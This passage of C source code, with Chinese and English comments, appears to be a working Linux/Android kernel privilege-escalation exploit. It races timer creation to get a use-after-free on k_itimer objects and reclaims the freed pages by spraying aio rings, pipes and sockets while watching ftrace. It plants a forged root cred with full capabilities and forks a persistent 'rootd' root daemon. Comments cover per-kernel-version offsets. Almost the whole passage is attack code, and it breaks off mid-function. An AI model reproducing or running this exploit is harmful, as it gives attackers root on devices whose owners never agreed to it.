/* E3 附带清理：原 raw_has_ptr() 没有调用点（死代码），且每 CPU malloc 8MB
 * 逐次全量读 raw，是本文件最重的重复 I/O 来源。删除；若将来需要"某指针是否
 * 出现在 raw trace 中"，用 raw_buf() 复用缓冲重写即可（git 历史里保留原实现）。 */

static int flush_timers(void)
{
	struct sigevent event;
	timer_t *ids = calloc(NFLUSH, sizeof(*ids));
	int created = 0;
	if (!ids)
		return -1;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < NFLUSH; i++) {
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &ids[i]))
			break;
		created++;
	}
	for (int i = 0; i < created; i++)
		timer_delete(ids[i]);
	free(ids);
	dprintf(STDOUT_FILENO, "[timer_flush] deleted=%d\n", created);
	return created >= 256 ? 0 : -1;
}

#define MAX_CPU 16
#define PER_CPU_RINGS 512
static uint64_t g_cpu_ctx[MAX_CPU][PER_CPU_RINGS];
static int g_cpu_n[MAX_CPU];
static int g_cpu_lines[MAX_CPU];
static int g_hit_cpu = -1;
static int g_hit_index = -1;

static void destroy_rings(void)
{
	for (int cpu = 0; cpu < MAX_CPU; cpu++) {
		for (int i = 0; i < g_cpu_n[cpu]; i++)
			syscall(SYS_io_destroy, g_cpu_ctx[cpu][i]);
		g_cpu_n[cpu] = 0;
	}
	g_nrings = 0;
}

static void *spray_cpu(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	struct timespec pause = { .tv_nsec = 400000000 };
	if (pin_cpu(cpu))
		return NULL;
	while (!atomic_load_explicit(&g_stop, memory_order_acquire) &&
	       g_cpu_n[cpu] < PER_CPU_RINGS) {
		int batch = 0;
		for (int i = 0; i < 32 && g_cpu_n[cpu] < PER_CPU_RINGS; i++) {
			uint64_t ctx = 0;
			if (syscall(SYS_io_setup, 1, &ctx)) {
				dprintf(STDOUT_FILENO, "[aio_spray] cpu%d stop errno=%d n=%d\n",
					cpu, errno, g_cpu_n[cpu]);
				return NULL;
			}
			g_cpu_ctx[cpu][g_cpu_n[cpu]++] = ctx;
			batch++;
		}
		if (!batch)
			break;
		nanosleep(&pause, NULL);
	}
	return NULL;
}

static int reclaim_and_plant(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	pthread_t threads[MAX_CPU];
	int ncpu, other = 0, rings = 0, free_hits = 0, alloc_hits = 0;
	int shown = 0, victim_frees = 0;
	uint64_t victim_base;
	if (node_off + 24 > 4096) {
		dprintf(STDOUT_FILENO, "[plant_node] node crosses a page off=%#x\n", node_off);
		return -1;
	}
	build_watch();
	victim_base = node_pfn & ~UINT64_C(1);
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[aio_spray] cpus=%d watch=%d node_pfn=%#" PRIx64 "\n",
		ncpu, g_nwatch, node_pfn);
	if (write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n"))
		return -1;
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	for (int cpu = 0; cpu < ncpu; cpu++) {
		if (pthread_create(&threads[cpu], NULL, spray_cpu, (void *)(intptr_t)cpu))
			ncpu = cpu;
	}
	for (int cpu = 0; cpu < ncpu; cpu++)
		pthread_join(threads[cpu], NULL);
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		int lines = 0;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			int filemap = strstr(line, "mm_filemap_add_to_page_cache:") &&
				      strstr(line, "uaf_plant");
			if (strstr(line, "mm_page_free:") && pfn != UINT64_MAX && watch_has(pfn)) {
				free_hits++;
				if (pfn == victim_base || pfn == node_pfn)
					victim_frees++;
				if (shown < 4) {
					dprintf(STDOUT_FILENO, "[free] %s", line);
					shown++;
				}
			}
			if (strstr(line, "mm_page_alloc:") && pfn != UINT64_MAX && watch_has(pfn)) {
				alloc_hits++;
				if (shown < 10) {
					dprintf(STDOUT_FILENO, "[alloc] %s", line);
					shown++;
				}
			}
			if (!filemap)
				continue;
			if (g_hit_index < 0 && pfn == node_pfn) {
				g_hit_cpu = cpu;
				g_hit_index = lines;
			} else if (g_hit_index < 0 && pfn != UINT64_MAX && watch_has(pfn))
				other++;
			lines++;
		}
		fclose(file);
		g_cpu_lines[cpu] = lines;
		rings += g_cpu_n[cpu];
		dprintf(STDOUT_FILENO, "[aio_spray] cpu%d rings=%d filemap=%d\n",
			cpu, g_cpu_n[cpu], lines);
	}
	g_nrings = rings;
	if (g_hit_index >= 0 && g_hit_cpu >= 0 &&
	    g_cpu_lines[g_hit_cpu] == g_cpu_n[g_hit_cpu] &&
	    g_hit_index < g_cpu_n[g_hit_cpu]) {
		uint32_t *ring = (uint32_t *)(uintptr_t)g_cpu_ctx[g_hit_cpu][g_hit_index];
		uint64_t *node;
		if (ring[4] != UINT32_C(0xa10a10a1)) {
			dprintf(STDOUT_FILENO, "[aio_spray] bad magic %#x\n", ring[4]);
			return -1;
		}
		node = (uint64_t *)((char *)ring + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
		__sync_synchronize();
		dprintf(STDOUT_FILENO,
			"[plant_node] cpu=%d ring=%d ctx=%p off=%#x target=%#" PRIx64 "\n",
			g_hit_cpu, g_hit_index, (void *)ring, node_off, target);
		quiet_reclaim_trace();
		return 0;
	}
	dprintf(STDOUT_FILENO,
		"[aio_spray] victim page missed rings=%d other_timer_pages=%d page_frees=%d page_allocs=%d victim_frees=%d\n",
		rings, other, free_hits, alloc_hits, victim_frees);
	quiet_reclaim_trace();
	return -1;
}

static unsigned long *g_hold;
static int g_nhold;
static pid_t g_holders[4];

static int hold_aio_children(void)
{
	int ready[2];
	if (pipe(ready))
		return -1;
	for (int i = 0; i < 4; i++) {
		pid_t pid = fork();
		if (pid < 0)
			return -1;
		if (pid == 0) {
			int n = 0;
			close(ready[0]);
			while (n < 20000) {
				unsigned long ctx = 0;
				if (syscall(SYS_io_setup, 1, &ctx))
					break;
				n++;
			}
			dprintf(STDOUT_FILENO, "[hold] child=%d rings=%d errno=%d\n",
				i, n, errno);
			if (write(ready[1], "x", 1) != 1)
				_exit(1);
			for (;;)
				pause();
		}
		g_holders[i] = pid;
	}
	close(ready[1]);
	for (int i = 0; i < 4; i++) {
		char bit;
		if (read(ready[0], &bit, 1) != 1)
			return -1;
	}
	close(ready[0]);
	return 0;
}
static int g_nhold;

/* E1：io_setup 数量上下限（默认 70000 = 历史值；上限受 aio-max-nr 约束，
 * 打满即视为成功前置条件满足，不再无限重试）。 */
#define DRAIN_AIO_RINGS_DEF 70000
#define DRAIN_AIO_RINGS_MIN 256
#define DRAIN_AIO_RINGS_MAX 262144

static int drain_aio(void)
{
	int cap = (int)env_ul("C98260_DRAIN_AIO_RINGS", DRAIN_AIO_RINGS_DEF,
			      DRAIN_AIO_RINGS_MIN, DRAIN_AIO_RINGS_MAX);
	int stop_errno = 0;
	g_hold = calloc((size_t)cap, sizeof(*g_hold));
	g_nhold = 0;
	if (!g_hold)
		return -1;
	while (g_nhold < cap) {
		unsigned long ctx = 0;
		if (syscall(SYS_io_setup, 1, &ctx)) {
			stop_errno = errno;
			break;
		}
		g_hold[g_nhold++] = ctx;
	}
	dprintf(STDOUT_FILENO, "[aio_hold] rings=%d cap=%d errno=%d%s\n",
		g_nhold, cap, stop_errno,
		stop_errno ? (errno_is_exhausted(stop_errno) ? " (quota)" : " (error)") : "");
	if (stop_errno && !errno_is_exhausted(stop_errno))
		dprintf(STDOUT_FILENO, "[aio_hold] unexpected errno=%d (%s)\n",
			stop_errno, strerror(stop_errno));
	return g_nhold > 1000 ? 0 : -1;
}

static void free_aio_hold(void)
{
	for (int i = 0; i < g_nhold; i++)
		syscall(SYS_io_destroy, g_hold[i]);
	g_nhold = 0;
	free(g_hold);
	g_hold = NULL;
}
static int g_catch[1024][2];
static int g_ncatch;

static int prepare_catch(void)
{
	g_ncatch = 0;
	for (int i = 0; i < 1024; i++) {
		if (pipe(g_catch[i]))
			break;
		if (fcntl(g_catch[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_catch[i][0]);
			close(g_catch[i][1]);
			break;
		}
		g_ncatch++;
	}
	dprintf(STDOUT_FILENO, "[pipe_reclaim] empty=%d\n", g_ncatch);
	return g_ncatch >= 128 ? 0 : -1;
}

static int reclaim_pipe(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	uint64_t victim_base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	unsigned char *page;
	int ncpu, wrote_pages = 0, free_hits = 0, order0 = 0, order1 = 0;
	if (node_off + 24 > 4096)
		return -1;
	page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page == MAP_FAILED)
		return -1;
	memset(page, 0, 4096);
	{
		uint64_t *node = (uint64_t *)(page + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[pipe_reclaim] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < g_ncatch; i++) {
		int done = 0;
		if ((i % 32) == 0) {
			struct timespec pause = { .tv_nsec = 100000000 };
			pin_cpu((i / 32) % ncpu);
			if (i)
				nanosleep(&pause, NULL);
		}
		while (done < 4096) {
			ssize_t n = write(g_catch[i][1], page + done, (size_t)(4096 - done));
			if (n < 0)
				break;
			done += (int)n;
		}
		if (done == 4096)
			wrote_pages++;
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			if (pfn == UINT64_MAX || !watch_has(pfn))
				continue;
			if (strstr(line, "mm_page_free:"))
				free_hits++;
			if (!strstr(line, "mm_page_alloc:"))
				continue;
			if (pfn != node_pfn && pfn != victim_base)
				continue;
			if (strstr(line, "order=0"))
				order0++;
			if (strstr(line, "order=1"))
				order1++;
			dprintf(STDOUT_FILENO, "[pipe_alloc] %s", line);
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[pipe_reclaim] wrote=%d frees=%d victim_order0=%d victim_order1=%d\n",
		wrote_pages, free_hits, order0, order1);
	quiet_reclaim_trace();
	munmap(page, 4096);
	return order0 > 0 ? 0 : -1;
}

static int g_stream[4][2];
static int g_nstream;
static unsigned g_shift;
static uint64_t g_task;
static uint64_t g_cred_kva;
static int g_plant_cred;
static int g_wake[2] = { -1, -1 };
static int g_report[2] = { -1, -1 };
static pid_t g_cred_child_pid = -1;

static void close_stream(void)
{
	for (int i = 0; i < g_nstream; i++) {
		if (g_stream[i][0] >= 0)
			close(g_stream[i][0]);
		if (g_stream[i][1] >= 0)
			close(g_stream[i][1]);
		g_stream[i][0] = g_stream[i][1] = -1;
	}
	g_nstream = 0;
}

static int g_fast;

int pc98260_run_rootd(void);

/*
 * Forged-cred field offsets are profile-driven (blob v4, see the statics at
 * the top of this file and init_offsets()). That closes review item B4: a KMI
 * shift now only means regenerating the profile from the device's boot.img
 * (BTF gives the real struct cred layout), no C change is needed.
 */

/*
 * R1：从 reclaim_stream 抽出的「构造 8KB 灌入模式」。
 *
 * 两种形态（由 g_plant_cred 决定）：
 *   g_plant_cred=1  在 node_off 处摆一份伪造 cred，字段偏移用 CRED_OFF_*（见 B4）；
 *   g_plant_cred=0  以 24 字节步长铺 k_itimer 的 rb_node，让悬挂节点指向 target。
 * 返回 0 成功；-1 表示该页布局放不下（已打印原因）。
 */
static int build_stream_pattern(unsigned char *pat, unsigned node_off,
				uint64_t base, uint64_t target, uint64_t victim)
{
	if (g_plant_cred) {
		uint64_t page = g_page_offset + (base << 12);
		uint64_t node_kva = victim + KITIMER_NODE;
		unsigned blob = node_off >= 0x40 ? 0 : 0x1f00;
		uint64_t *cred;
		if (node_off + CRED_PLANT_SIZE > 8192 || blob + 32 > 8192 ||
		    page + node_off != node_kva) {
			dprintf(STDOUT_FILENO, "[cred] plant does not fit off=%#x\n",
				node_off);
			return -1;
		}
		if (!(node_off >= blob + 32 || blob >= node_off + CRED_PLANT_SIZE)) {
			dprintf(STDOUT_FILENO, "[cred] blob overlaps node\n");
			return -1;
		}
		cred = (uint64_t *)(pat + node_off);
		if (CRED_UID_OFF >= 8) {
			/* 6.6/6.12/6.18: usage 占 8 字节，uid@8，直接写这三个槽位 */
			cred[0] = node_kva;                     /* usage（非 0 防止提前释放） */
			cred[1] = 0;                            /* uid / gid */
			cred[2] = g_task + TASK_CRED;           /* suid / sgid（历史行为，保留） */
		} else {
			/*
			 * 5.15/6.1: usage 只有 4 字节、uid@4；写 8 字节会把 uid 打成
			 * node_kva 的高半部，16 处又是 sgid/euid —— 这两处都不能碰，
			 * 只写 usage，uid..fsgid 保持 memset 的 0。
			 */
			*(uint32_t *)(pat + node_off) = (uint32_t)node_kva;
		}
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_INH)  = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_PERM) = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_EFF)  = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_BSET) = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_AMB)  = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_SELINUX)  = page + blob;
		*(uint64_t *)(pat + node_off + CRED_OFF_ROOT_USER)= slide_addr(LINK_ROOT_USER);
		*(uint64_t *)(pat + node_off + CRED_OFF_USER_NS)  = slide_addr(LINK_USER_NS);
		*(uint64_t *)(pat + node_off + CRED_OFF_UCOUNTS)  = slide_addr(LINK_UCOUNTS);
		*(uint64_t *)(pat + node_off + CRED_OFF_GROUPS)   = slide_addr(LINK_GROUPS);
		dprintf(STDOUT_FILENO,
			"[cred] node=%#" PRIx64 " task+cred=%#" PRIx64 " off=%#x\n",
			node_kva, g_task + TASK_CRED, node_off);
	} else {
		unsigned align = node_off % 24u;
		for (unsigned off = align; off + 24 <= 8192; off += 24) {
			uint64_t *node = (uint64_t *)(pat + off);
			node[0] = 0;
			node[1] = 0;
			node[2] = target;
		}
		dprintf(STDOUT_FILENO, "[stream_backfill] tile align=%u off=%#x\n", align, node_off);
	}
	return 0;
}

/** R1：从 reclaim_stream 抽出的「开 4 对已放大缓冲的 socketpair」。 */
static int open_stream_pairs(int big)
{
	g_nstream = 0;
	for (int i = 0; i < 4; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_stream[i]))
			break;
		setsockopt(g_stream[i][0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
		setsockopt(g_stream[i][1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
		fcntl(g_stream[i][0], F_SETFL, O_NONBLOCK);
		g_nstream++;
	}
	return g_nstream ? 0 : -1;
}

static int reclaim_stream(uint64_t victim, uint64_t target)
{
	uint64_t base = object_pfn(victim + KITIMER_NODE) & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0x1fff);
	unsigned char *pat;
	int big = 16 << 20, hit = 0, writes = 0, ncpu;
	struct timespec start, now;
	if (node_off + 24 > 8192)
		return -1;
	pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pat == MAP_FAILED)
		return -1;
	memset(pat, 0, 8192);
	/* R1：模式构造已抽出为 build_stream_pattern */
	if (build_stream_pattern(pat, node_off, base, target, victim)) {
		munmap(pat, 8192);
		return -1;
	}
	/* R1：socketpair 建立已抽出为 open_stream_pairs */
	if (open_stream_pairs(big)) {
		munmap(pat, 8192);
		return -1;
	}
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[stream_backfill] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
		g_nstream, base, node_off);
	if (write_file(TRACE "/buffer_size_kb", "65536\n")) {
		close_stream();
		return -1;
	}
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss()) {
		close_stream();
		return -1;
	}
	{
		struct timespec pause = { .tv_nsec = 200000000 };
		int freed = 0;
		int waitn = g_fast ? 12 : 40;
		for (int i = 0; i < waitn && !freed; i++) {
			nanosleep(&pause, NULL);
			freed = trace_seen("mm_page_free:", base);
		}
		dprintf(STDOUT_FILENO, "[stream_backfill] page_freed=%d\n", freed);
	}
	clock_gettime(CLOCK_MONOTONIC, &start);
	int rounds = g_fast ? 10 : 6;
	for (int round = 0; round < rounds && !hit; round++) {
		int sends = g_fast ? 200 : 80;
		for (int i = 0, sock = 0; i < sends && !hit; i++) {
			ssize_t n;
			pin_cpu(i % ncpu);
			n = write(g_stream[sock][0], pat, 8192);
			if (n == 8192)
				writes++;
			else if (++sock >= g_nstream)
				break;
		}
		hit = trace_seen("mm_page_alloc:", base);
		clock_gettime(CLOCK_MONOTONIC, &now);
		if (now.tv_sec - start.tv_sec > 8)
			break;
	}
	write_file(TRACE "/tracing_on", "0\n");
	if (hit)
		dprintf(STDOUT_FILENO, "[stream_backfill] hit pfn=%#" PRIx64 "\n", base);
	dprintf(STDOUT_FILENO, "[stream_backfill] writes=%d hit=%d\n", writes, hit);
	quiet_reclaim_trace();
	munmap(pat, 8192);
	if (!hit)
		close_stream();
	return hit ? 0 : -1;
}

static int g_dgram[2] = { -1, -1 };

static int reclaim_dgram(uint64_t victim, uint64_t target)
{
	uint64_t node_pfn = object_pfn(victim + KITIMER_NODE);
	uint64_t base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0xfff);
	unsigned char *buf;
	int ncpu, sent = 0, hit = 0, big = 8 << 20;
	int victim_frees = 0, buddy_frees = 0, order2 = 0;
	uint64_t buddy = base ^ UINT64_C(2);
	if (node_off + 24 > 4096)
		return -1;
	buf = mmap(NULL, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED)
		return -1;
	memset(buf, 0, 16000);
	for (int page = 0; page < 4; page++) {
		unsigned off = (unsigned)page * 4096u + node_off;
		uint64_t *node;
		if (off + 24 > 16000)
			continue;
		node = (uint64_t *)(buf + off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_dgram)) {
		munmap(buf, 16384);
		return -1;
	}
	setsockopt(g_dgram[0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
	setsockopt(g_dgram[1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
	fcntl(g_dgram[0], F_SETFL, O_NONBLOCK);
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[dgram_reclaim] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < 512; i++) {
		struct timespec pause = { .tv_nsec = 40000000 };
		ssize_t n;
		if ((i % 8) == 0)
			pin_cpu((i / 8) % ncpu);
		n = send(g_dgram[0], buf, 16000, MSG_DONTWAIT);
		if (n == 16000)
			sent++;
		else if (i > 16 && sent > 8)
			break;
		if ((i % 8) == 7)
			nanosleep(&pause, NULL);
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn;
			pfn = parse_pfn(line);
			if (pfn == UINT64_MAX)
				continue;
			if (strstr(line, "mm_page_free:") && strstr(line, "order=1")) {
				if (pfn == base)
					victim_frees++;
				if (pfn == buddy)
					buddy_frees++;
			}
			if (!strstr(line, "mm_page_alloc:") || !strstr(line, "order=2"))
				continue;
			order2++;
			if (base == pfn || base == pfn + 2) {
				hit = 1;
				dprintf(STDOUT_FILENO, "[dgram_reclaim] hit %s", line);
			}
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[dgram_reclaim] sent=%d hit=%d order2=%d victim_frees=%d buddy_frees=%d buddy=%#" PRIx64 "\n",
		sent, hit, order2, victim_frees, buddy_frees, buddy);
	quiet_reclaim_trace();
	munmap(buf, 16384);
	return hit ? 0 : -1;
}

static int one_uaf(uint64_t target)
{
	struct timespec c0, c1;
	long cms;
	clock_gettime(CLOCK_MONOTONIC, &c0);
	pid_t child;
	int code, status = 0;
	uint64_t ptrs[64];
	int nptr, ntext;
	uint64_t victim;
	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
	ipc->nhelpers = 0;
	child = fork();
	if (child < 0)
		return -1;
	if (child == 0) {
		if (g_wake[0] >= 0)
			close(g_wake[0]);
		if (g_wake[1] >= 0)
			close(g_wake[1]);
		if (g_report[0] >= 0)
			close(g_report[0]);
		if (g_report[1] >= 0)
			close(g_report[1]);
		child_race();
	}
	if (wait_phase(1)) {
		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n",
			atomic_load_explicit(&ipc->phase, memory_order_acquire));
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (write_file(TRACE "/buffer_size_kb", "16384\n") ||
	    arm_kmem_cache_alloc() ||
	    trace_off_on()) {
		kill(child, SIGKILL);
		stop_helpers();
		return -1;
	}
	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
	if (wait_phase(3)) {
		dprintf(STDOUT_FILENO, "[uaf] timer was not created\n");
		write_file(TRACE "/tracing_on", "0\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	write_file(TRACE "/tracing_on", "0\n");
	if (collect_nth(1024, &nptr, &victim)) {
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (nptr < 1500) {
		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	disarm_kmem_cache_alloc();
	atomic_store_explicit(&ipc->phase, 4, memory_order_release);
	if (g_plant_cred)
		g_cred_kva = victim + KITIMER_NODE;
	if (reclaim_stream(victim, target)) {
		clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=page_miss fast=%d\n", cms, g_fast);
	dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
		stop_helpers();
		return -1;
	}
	close_socks();
	code = wait_zombie(child, &status);
	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
		child, code, status);
	if (waitpid(child, &status, 0) < 0)
		return -1;
	clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=ok fast=%d\n", cms, g_fast);
	log_sync();
	dprintf(STDOUT_FILENO, "[uaf] reaped status=%d\n", status);
	destroy_rings();
	stop_helpers();
	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
		return -1;
	}
	return 0;
}

static volatile int g_daemon_mode = 0;
/* rootd is forked exactly once, the first time the escalation is confirmed.
 * Guarding it matters: ask_child() re-enters this code on every poll, and a
 * second rootd would fight over the same socket path. */
static int g_rootd_forked = 0;

static void cred_child(void)
{
	sigset_t block;
	setpgid(0, 0);
	sigfillset(&block);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	g_wake[1] = g_report[0] = -1;
	dprintf(STDOUT_FILENO, "[child-cred] waiting pid=%d\n", getpid());
	/*
	 * Lock the whole address space. The forged cred lives in a reclaimed page
	 * that this process borrowed from the parent; without MCL_CURRENT the page
	 * can be reclaimed under us and the cred read back as the original uid
	 * (that is exactly the "[cred] installed" followed by "Uid: 2000" symptom).
	 * MCL_FUTURE keeps pages allocated later (fork, heap growth) locked too.
	 */
	if (mlockall(MCL_CURRENT | MCL_FUTURE))
		dprintf(STDOUT_FILENO, "[child-cred] warn: mlockall errno=%d\n", errno);
	for (;;) {
		unsigned uid, euid, gid, egid;
		unsigned char go;
		char msg[96];
		/* Blocking read, as in the reference implementation: the child stays
		 * asleep unless the parent actually talks to it, which keeps the page
		 * reclaim race undisturbed. A read failure means the parent closed the
		 * pipe, i.e. it retired after handing the pages over. */
		if (read(g_wake[0], &go, 1) != 1) {
			if (g_daemon_mode) {
				/*
				 * Detach and then do nothing at all -- this is the reference
				 * shape (PC uaf_plant.c:1471-1487).
				 *
				 * This task's ->cred points into the reclaimed page, and it is
				 * the only thing that must never stop running. It therefore
				 * must not execute anything else either: every syscall, fork or
				 * page fault it performs is one more chance for the kernel to
				 * touch a page that has since been reused. rootd runs in its
				 * own process (forked below), so after this point the only
				 * thing left here is pause().
				 */
				dprintf(STDOUT_FILENO,
					"[child-cred] daemon mode: holding pages\n");
				log_sync();
				setsid();
				close(STDIN_FILENO);
				close(STDOUT_FILENO);
				close(STDERR_FILENO);
				open("/dev/null", O_RDONLY);
				open("/dev/null", O_WRONLY);
				open("/dev/null", O_WRONLY);
				for (;;)
					pause();
			}
			continue;
		}
		if (go == 0xAA) {
			/* Daemon command: acknowledge, drop the pipes, and keep looping
			 * until the parent closes its ends. */
			dprintf(STDOUT_FILENO, "[child-cred] entering daemon mode\n");
			log_sync();
			const char *ack = "daemon\n";
			(void)write(g_report[1], ack, strlen(ack));
			close(g_wake[0]);
			close(g_report[1]);
			g_daemon_mode = 1;
			continue;
		}
		uid = getuid();
		euid = geteuid();
		gid = getgid();
		egid = getegid();
		snprintf(msg, sizeof(msg), "uid=%u euid=%u gid=%u egid=%u\n",
			 uid, euid, gid, egid);
		if (write(g_report[1], msg, strlen(msg)) < 0)
			dprintf(STDOUT_FILENO, "[child-cred] answer errno=%d\n", errno);
		dprintf(STDOUT_FILENO, "[child-cred] %s", msg);
		/*
		 * Root confirmed: hand rootd its own process (PC uaf_plant.c:1516-1525).
		 *
		 * Always fork here, --daemon-exit or not. The daemon branch above only
		 * parks; rootd has to be a separate task so that the task carrying the
		 * forged cred never runs anything beyond pause(). This fork happens
		 * while the parent is still alive, so rootd inherits the log file on
		 * fd 1 / fd 2 and the host can still see C98260_ROOTD_READY=1 even
		 * though the daemon redirects its own stdio to /dev/null.
		 *
		 * The forked rootd gets a *copy* of the cred from prepare_creds(), i.e.
		 * a real cred_jar object, so it can fork shells and exit normally.
		 */
		if (uid == 0 && euid == 0 && !g_rootd_forked) {
			pid_t rd = fork();
			if (rd == 0) {
				setpgid(0, 0);
				pc98260_run_rootd();
				_exit(0);
			}
			g_rootd_forked = 1;
			dprintf(STDOUT_FILENO, "[child-cred] rootd forked pid=%d\n", (int)rd);
		}
	}
}

static void log_proc_uid(pid_t pid)
{
	char path[64];
	char line[160];
	FILE *file;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
	file = fopen(path, "r");
	if (!file)
		return;
	while (fgets(line, sizeof(line), file)) {
		if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
		    !strncmp(line, "State:", 6))
			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
	}
	fclose(file);
}

static int ask_child(unsigned *uid, unsigned *euid)
{
	char buf[80];
	struct pollfd pfd;
	unsigned char go = 1;
	ssize_t n;
	if (kill(g_cred_child_pid, 0) != 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d is dead errno=%d\n",
			g_cred_child_pid, errno);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	fcntl(g_report[0], F_SETFL, O_NONBLOCK);
	while (read(g_report[0], buf, sizeof(buf)) > 0)
		;
	fcntl(g_report[0], F_SETFL, 0);
	if (write(g_wake[1], &go, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred] ask write errno=%d\n", errno);
		return -1;
	}
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 2000) <= 0) {
